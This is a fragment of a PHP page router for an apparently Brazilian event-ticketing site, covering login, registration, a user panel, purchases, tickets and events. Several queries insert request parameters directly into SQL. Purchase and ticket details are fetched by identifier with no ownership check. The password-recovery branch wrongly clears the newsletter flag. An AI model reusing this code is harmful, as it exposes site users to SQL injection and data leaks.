			} elseif(trim($_REQUEST['var1'])=="login-incorreto") {
				if(trim($rSqlUsuario['id'])=="") {
					$pagina="login-incorreto.php";    	
					$nomeCabecalho = "Dados incorretos ou você não possui cadastro";
					$titulo_da_paginaSet  = $nomeCabecalho;
					$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";            
				} else {
					echo "<script>window.open('".$link_modelo."painel/','_self','')</script>";
				}
				
			} elseif(trim($_REQUEST['var1'])=="".$url_acesso."") {
				if(trim($rSqlUsuario['id'])=="") {
					$pagina="login.php";    	
					$nomeCabecalho = "Acesse sua conta";
					$titulo_da_paginaSet  = $nomeCabecalho;
					$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";            
				} else {
					echo "<script>window.open('".$link_modelo."painel/','_self','')</script>";
				}
				
			} elseif(trim($_REQUEST['var1'])=="termos-de-uso") {
				$pagina="texto.php";    	
				$camposPrefixo = "termos_de_uso";	
				$nomeCabecalho = "".$rSqlEmpresaConfig[''.$camposPrefixo.'_titulo']."";
				$textoDaPagina = $rSqlEmpresaConfig[''.$camposPrefixo.''];
				$titulo_da_paginaSet  = "".$nomeCabecalho."";
				$titulo_seo = "".$configuracoes_site['nome']." - ".$nomeCabecalho."";            

			} elseif(trim($_REQUEST['var1'])=="politica-de-privacidade") {
				$pagina="texto.php";    
				$camposPrefixo = "politica_de_privacidade";	
				$nomeCabecalho = "".$rSqlEmpresaConfig[''.$camposPrefixo.'_titulo']."";
				$textoDaPagina = $rSqlEmpresaConfig[''.$camposPrefixo.''];
				$titulo_da_paginaSet  = "".$nomeCabecalho."";
				$titulo_seo = "".$configuracoes_site['nome']." - ".$nomeCabecalho."";            

			} elseif(trim($_REQUEST['var1'])=="aceite-extra-1") {
				$pagina="texto.php";    
				$nomeCabecalho = "".$configuracoes_site['aceite_extra_1_label']."";
				$textoDaPagina = $configuracoes_site['aceite_extra_1_texto'];
				$titulo_da_paginaSet  = "".$nomeCabecalho."";
				$titulo_seo = "".$configuracoes_site['nome']." - ".$nomeCabecalho."";            

			} elseif(trim($_REQUEST['var1'])=="".$url_cadastro."") {
				if(trim($rSqlUsuario['id'])=="") {
					if(trim($_REQUEST['var2'])=="usuario-ja-existente") {
						$pagina="usuario-ja-existente.php";    	
						$nomeCabecalho = "Cadastro Já Existente";
						$titulo_da_paginaSet  = $nomeCabecalho;
						$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";            
					} else {
						$pagina="cadastre-se.php";    	
						$nomeCabecalho = "Cadastre-se";
						$titulo_da_paginaSet  = $nomeCabecalho;
						$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";            
					}
				} else {
					echo "<script>window.open('".$link_modelo."painel/','_self','')</script>";
				}

			} elseif(trim($_REQUEST['var1'])=="esqueceu-sua-senha") {
				if(trim($rSqlUsuario['id'])=="") {
					$pagina="esqueceu-sua-senha.php";    	
					$nomeCabecalho = "Esqueceu sua senha?";
					$titulo_da_paginaSet  = $nomeCabecalho;
					$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";            
				} else {
					echo "<script>window.open('".$link_modelo."painel/','_self','')</script>";
				}

			} elseif(trim($_REQUEST['var1'])=="pagar-ingresso") {
				if(trim($rSqlUsuario['id'])=="") {
					echo "<script>window.open('".$link_modelo."".$url_acesso."/','_self','')</script>";
				} else {
					$pagina="pagar-ingresso.php";    	
					$nomeCabecalho = "Pagar Ingresso";
					$titulo_da_paginaSet  = $nomeCabecalho;
					$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";            
				}

			} elseif(trim($_REQUEST['var1'])=="confirmacao-de-email") {
				$rSqlUsuario = mysql_fetch_array(mysql_query("SELECT id FROM pessoas WHERE numeroUnico='".$_REQUEST['var2']."'"));
				if(trim($rSqlUsuario['id'])=="") {
					$pagina="confirmacao-de-email-erro.php";    	
					$nomeCabecalho = "Erro na confirmação de E-mail";
					$titulo_da_paginaSet  = $nomeCabecalho;
					$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";            
				} else {
					$update = mysql_query("
											UPDATE 
												pessoas 
											SET 
												email_valido='1'
											WHERE 
												id='".$rSqlUsuario['id']."'
											");
					$pagina="confirmacao-de-email.php";    	
					$nomeCabecalho = "Sucesso na confirmação de E-mail";
					$titulo_da_paginaSet  = $nomeCabecalho;
					$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";            
				}

			} elseif(trim($_REQUEST['var1'])=="cancelar-assinatura") {
				$rSqlUsuario = mysql_fetch_array(mysql_query("SELECT id FROM pessoas WHERE numeroUnico='".$_REQUEST['var2']."'"));
				if(trim($rSqlUsuario['id'])=="") { } else {
					$update = mysql_query("
											UPDATE 
												pessoas 
											SET 
												newsletter='0'
											WHERE 
												id='".$rSqlUsuario['id']."'
											");
				}
				$pagina="cancelar-assinatura.php";    	
				$nomeCabecalho = "Cancelamento de assinatura de newsletter";
				$titulo_da_paginaSet  = $nomeCabecalho;
				$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";            

			} elseif(trim($_REQUEST['var1'])=="recuperacao-de-senha") {
				$rSqlUsuario = mysql_fetch_array(mysql_query("SELECT id FROM pessoas WHERE token_esqueceu_sua_senha='".$_REQUEST['var2']."'"));
				if(trim($rSqlUsuario['id'])=="") { } else {
					$update = mysql_query("
											UPDATE 
												pessoas 
											SET 
												newsletter='0'
											WHERE 
												id='".$rSqlUsuario['id']."'
											");
				}
				$pagina="recuperacao-de-senha.php";    	
				$nomeCabecalho = "Recuperação de senha";
				$titulo_da_paginaSet  = $nomeCabecalho;
				$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";            

			} elseif(trim($_REQUEST['var1'])=="painel") {
				if(trim($rSqlUsuario['id'])=="") { 
					echo "<script>window.open('".$link_modelo."".$url_cadastro."/','_self','')</script>";
				} else {
					$pagina="painel.php";    	

					if(trim($_REQUEST['var2'])=="") {
						$pagina_in="painel-meus-dados.php";    	
						$nomeCabecalho = "Meus Dados";
						$titulo_da_paginaSet  = $nomeCabecalho;
						$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";            
					} elseif(trim($_REQUEST['var2'])=="meus-dados")    { 
						$pagina_in="painel-meus-dados.php";    	
						$nomeCabecalho = "Meus Dados";
						$titulo_da_paginaSet  = $nomeCabecalho;
						$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";   
								 
					} elseif(trim($_REQUEST['var2'])=="meu-endereco")    { 
						$pagina_in="painel-meu-endereco.php";    	
						$nomeCabecalho = "Meu Endereço";
						$titulo_da_paginaSet  = $nomeCabecalho;
						$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";   
								 
					} elseif(trim($_REQUEST['var2'])=="alterar-senha")    { 
						$pagina_in="painel-alterar-senha.php";    	
						$nomeCabecalho = "Alterar Senha";
						$titulo_da_paginaSet  = $nomeCabecalho;
						$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";   
								 
					} elseif(trim($_REQUEST['var2'])=="".$url_minhas_compras."")    { 
						if(trim($_REQUEST['var3'])=="") {
							$pagina_in="painel-minhas-compras.php";    	
							$nomeCabecalho = "".$configuracoes_site['label_menu_minhas_compras_plural']."";
							$titulo_da_paginaSet  = $nomeCabecalho;
							$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";            
						} else {
							$strSql = "
								SELECT 
									mod_carrinho.empresa,
									mod_carrinho.id,
									mod_carrinho.empresa_token,
									mod_carrinho.numeroUnico,
									mod_carrinho.numeroUnico_pai,
									mod_carrinho.numeroUnico_comprador,
									mod_carrinho.cod_contrato,
									mod_carrinho.valor_subtotal,
									mod_carrinho.valor_desconto,
									mod_carrinho.valor_total,
									mod_carrinho.objeto_carrinho,
									mod_carrinho.objeto_carrinho_detalhado,
									mod_carrinho.forma_de_pagamento,
									mod_carrinho.tipo_operacao,
									mod_carrinho.dataObjeto,
									mod_carrinho.objetoItensCobranca,
									mod_carrinho.objetoEnderecoPagamento,
									mod_carrinho.objetoFormaPagamento,
									mod_carrinho.pago,
									mod_carrinho.stat,
									mod_carrinho.dataModificacao,
									mod_carrinho.dataLimitePagamento,
									mod_carrinho.data,
			
									mod_carrinho.envia_email,
									mod_carrinho.envia_whatsapp,
									mod_carrinho.envia_sms,
									mod_carrinho.aceita_boleto,
									mod_carrinho.aceita_ccr,
									mod_carrinho.aceita_ccr_vezes,
									mod_carrinho.aceita_ccd,
									mod_carrinho.aceita_pix,
			
									mod_carrinho.pessoa_nome,
									mod_carrinho.pessoa_documento,
									mod_carrinho.pessoa_email,
									mod_carrinho.pessoa_telefone,
									
									mod_comprador.nome AS comprador_nome,
									mod_comprador.documento AS comprador_documento,
									mod_comprador.data_de_nascimento AS comprador_data_de_nascimento,
									mod_comprador.genero AS comprador_genero,
									mod_comprador.email AS comprador_email,
									mod_comprador.telefone AS comprador_telefone,
									mod_comprador.whatsapp AS comprador_whatsapp
								FROM 
									carrinho AS mod_carrinho 
								LEFT JOIN 
									pessoas AS mod_comprador ON (mod_comprador.numeroUnico = mod_carrinho.numeroUnico_comprador)
								
								WHERE 
									mod_carrinho.numeroUnico='".$_REQUEST['var3']."'
							";
							$rSqlItem = mysql_fetch_array(mysql_query("".$strSql.""));
							if(trim($rSqlItem['id'])=="") {
								$pagina="404.php";             
								$nomeCabecalho = "Página não encontrada";
								$titulo_da_paginaSet  = $nomeCabecalho;
								$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";            
							} else {
								$pagina_in="painel-minhas-compras-detalhe.php";    	
								$nomeCabecalho = "".$configuracoes_site['label_menu_minhas_compras']."";
								$titulo_da_paginaSet  = $nomeCabecalho;
								$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";   
							}
						}

					} elseif(trim($_REQUEST['var2'])=="".$url_meus_ingressos."")    { 
						if(trim($rSqlUsuario['documento'])=="" || trim($rSqlUsuario['email'])=="") {
							echo "<script>window.open('".$link_modelo."painel/','_self','')</script>";
						} else {
							if(trim($_REQUEST['var3'])=="") {
								$pagina_in="painel-meus-ingressos.php";    	
								$nomeCabecalho = "".$configuracoes_site['label_menu_meus_ingressos_plural']."";
								$titulo_da_paginaSet  = $nomeCabecalho;
								$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";   
							} else {
								$strSql = "
									SELECT 
										mod_carrinho.id,
										mod_carrinho.numeroUnico,
										mod_carrinho.numeroUnico_pai,
										mod_carrinho.numeroUnico_carrinho,
										mod_carrinho.numeroUnico_pessoa,
										mod_carrinho.numeroUnico_cod_voucher,
										mod_carrinho.cod_voucher,
										mod_carrinho.label,
										mod_carrinho.pessoa_nome,
										mod_carrinho.pessoa_email,
										mod_carrinho.pessoa_documento,
										mod_carrinho.pessoa_telefone,
										mod_carrinho.numeroUnico_evento,
										mod_carrinho.numeroUnico_ticket,
										mod_carrinho.numeroUnico_lote,
										mod_carrinho.numeroUnico_produto,
	
										mod_eventos.nome AS eventos_nome,
										mod_eventos.tickets AS eventos_tickets,

										mod_carrinho.evento_nome,
										mod_carrinho.ingresso_nome,
										mod_carrinho.lote_nome,
										mod_carrinho.produto_nome,
										mod_carrinho.valor,
	
										mod_carrinho.confirmado,
										mod_carrinho.data,
										mod_carrinho.stat
									FROM 
										carrinho_notificacao AS mod_carrinho 
									LEFT JOIN 
										eventos AS mod_eventos ON (mod_eventos.numeroUnico = mod_carrinho.numeroUnico_evento)
									
									WHERE 
										mod_carrinho.numeroUnico='".$_REQUEST['var3']."'
						
									ORDER BY
										mod_carrinho.data DESC
										
								";
								$rSqlItem = mysql_fetch_array(mysql_query("".$strSql.""));
								if(trim($rSqlItem['id'])=="") {
									$pagina="404.php";             
									$nomeCabecalho = "Página não encontrada";
									$titulo_da_paginaSet  = $nomeCabecalho;
									$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";            
								} else {
									$pagina_in="painel-meus-ingressos-detalhe.php";    	
									$nomeCabecalho = "".$configuracoes_site['label_menu_meus_ingressos']."";
									$titulo_da_paginaSet  = $nomeCabecalho;
									$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";   
								}
							}
						}

								 
					} elseif(trim($_REQUEST['var2'])=="sair")    { 
						session_destroy(); 
						echo "<script>window.open('".$link_modelo."','_self','')</script>";
					}
				}
			} elseif(trim($_REQUEST['var1'])=="compra-boleto-com-sucesso") {
				$pagina="compra-boleto-com-sucesso.php";    	
				$nomeCabecalho = "".$configuracoes_site['titulo_compra_boleto_pagar']."";
				$titulo_da_paginaSet  = $nomeCabecalho;
				$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";            

			} elseif(trim($_REQUEST['var1'])=="compra-em-analise") {
				$pagina="compra-em-analise.php";    	
				$nomeCabecalho = "".$configuracoes_site['titulo_compra_em_analise']."";
				$titulo_da_paginaSet  = $nomeCabecalho;
				$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";            

			} elseif(trim($_REQUEST['var1'])=="compra-realizada-com-sucesso") {
				$pagina="compra-realizada-com-sucesso.php";    	
				$nomeCabecalho = "".$configuracoes_site['titulo_compra_confirmada']."";
				$titulo_da_paginaSet  = $nomeCabecalho;
				$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";            

			} elseif(trim($_REQUEST['var1'])=="problema-na-compra") {
				$pagina="compra-com-erro.php";    	
				$nomeCabecalho = "".$configuracoes_site['titulo_compra_erro']."";
				$titulo_da_paginaSet  = $nomeCabecalho;
				$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";            

			} elseif(trim($_REQUEST['var1'])=="".$url_eventos_plural."") {
				if(trim($configuracoes_site['modelo_lista_eventos'])=="" || trim($configuracoes_site['modelo_lista_eventos'])=="eventos") {
					$configuracoes_site['modelo_lista_eventos'] = "eventos";
				} else {
					$configuracoes_site['modelo_lista_eventos'] = "".$configuracoes_site['modelo_lista_eventos']."";
				}
				$pagina="".$configuracoes_site['modelo_lista_eventos'].".php";    	
				$nomeCabecalho = "".$configuracoes_site['label_menu_eventos_plural']."";
				$titulo_da_paginaSet  = $nomeCabecalho;
				$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";            

			} elseif(trim($_REQUEST['var1'])=="".$url_eventos."") {
				if(trim($_REQUEST['var2'])=="") {
					$pagina="404.php";             
					$nomeCabecalho = "Página não encontrada";
					$titulo_da_paginaSet  = $nomeCabecalho;
					$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";            
				} else {
					$rSqlEvento = mysql_fetch_array(mysql_query("SELECT * FROM eventos WHERE id='".$_REQUEST['var2']."' AND data_de_publicacao <= '".date("Y-m-d")."' AND data_de_despublicacao >= '".date("Y-m-d")."' AND stat='1'"));
					if(trim($rSqlEvento['id'])=="") { 
						$pagina="404.php";             
						$nomeCabecalho = "Página não encontrada";
						$titulo_da_paginaSet  = $nomeCabecalho;
						$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";            
					} else {
						$pagina="evento.php";    	
						$nomeCabecalho = "".$rSqlEvento['nome']."";
						$titulo_da_paginaSet  = $nomeCabecalho;
						$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";            
					}
				}

			} elseif(trim($_REQUEST['var1'])=="".$url_contato."") {
				$pagina="contato.php";    	
				$nomeCabecalho = "".$configuracoes_site['label_menu_contato']."";
				$titulo_da_paginaSet  = $nomeCabecalho;
				$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";            

			} else {
				$pagina="404.php";             
				$nomeCabecalho = "Página não encontrada";
				$titulo_da_paginaSet  = $nomeCabecalho;
				$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";            

				$menu_topoArray = unserialize($configuracoes_site['menu_topo']);
				$menu_topoArray = array_sort($menu_topoArray, 'ordem', SORT_ASC);
				foreach ($menu_topoArray as $key_topo => $value_topo) {
					$url_navegacao = "".transformaCaractere($value_topo['nome'])."";
					if(trim($_REQUEST['var1'])=="".$url_navegacao."") {
						if($value_topo['modulo']=="QuemSomos") {
							$rSqlDescricao = mysql_fetch_array(mysql_query("SELECT * FROM institucional_descricao WHERE empresa_token='".$rSqlEmpresaConfig['token']."' ORDER BY data DESC LIMIT 1"));
							$pagina="institucional.php";             
							$nomeCabecalho = $rSqlDescricao['titulo_da_pagina'];             
							$titulo_da_paginaSet  = $nomeCabecalho;
							$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";             
						} else if($value_topo['modulo']=="Blog") {
							$rSqlDescricao = mysql_fetch_array(mysql_query("SELECT * FROM blog_descricao WHERE empresa_token='".$rSqlEmpresaConfig['token']."' ORDER BY data DESC LIMIT 1"));
							if(trim($_REQUEST['var2'])=="") {
								$pagina="blog.php";             
								$nomeCabecalho = $rSqlDescricao['titulo_da_pagina'];             
								$titulo_da_paginaSet  = $nomeCabecalho;
								$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";             
							} else {
								$rSqlItem = mysql_fetch_array(mysql_query("SELECT * FROM blog WHERE url_amigavel='".$_REQUEST['var2']."'"));
								$pagina="post.php";             
								$nomeCabecalho = $rSqlItem['nome'];             
								$titulo_da_paginaSet  = $nomeCabecalho;
								$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";             
							}
						} else if($value_topo['modulo']=="Duvidas") {


						} else if($value_topo['modulo']=="ConteudoPersonalizado") {
							$rSqlPaginaItem = mysql_fetch_array(mysql_query("SELECT * FROM conteudo_personalizado WHERE stat='1' AND numeroUnico='".$value_topo['modulo_item']."'"));
							$pagina="conteudo-personalizado.php";             
							
							$nomeCabecalho = $rSqlPaginaItem['nome'];             
							$titulo_da_paginaSet  = $nomeCabecalho;
							$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";             
						} else if($value_topo['modulo']=="Galeria") {
							if(trim($_REQUEST['var2'])=="") {
								$pagina="galerias.php";             
								$nomeCabecalho = $value_topo['nome'];             
								$titulo_da_paginaSet  = $nomeCabecalho;
								$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";             
							} else {
								$rSqlItem = mysql_fetch_array(mysql_query("SELECT * FROM album_de_fotos WHERE id='".$_REQUEST['var2']."'"));
								$pagina="galeria.php";             
								$nomeCabecalho = $rSqlItem['nome'];             
								$titulo_da_paginaSet  = $nomeCabecalho;
								$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";             
							}
						}
					}
				}
			}
		}
		
	}

	include("".$_SERVER['DOCUMENT_ROOT']."/templates/".$pasta_template."/index_header.php");
	include("".$_SERVER['DOCUMENT_ROOT']."/templates/".$pasta_template."/".$pagina."");
	include("".$_SERVER['DOCUMENT_ROOT']."/templates/".$pasta_template."/index_footer.php");

?>
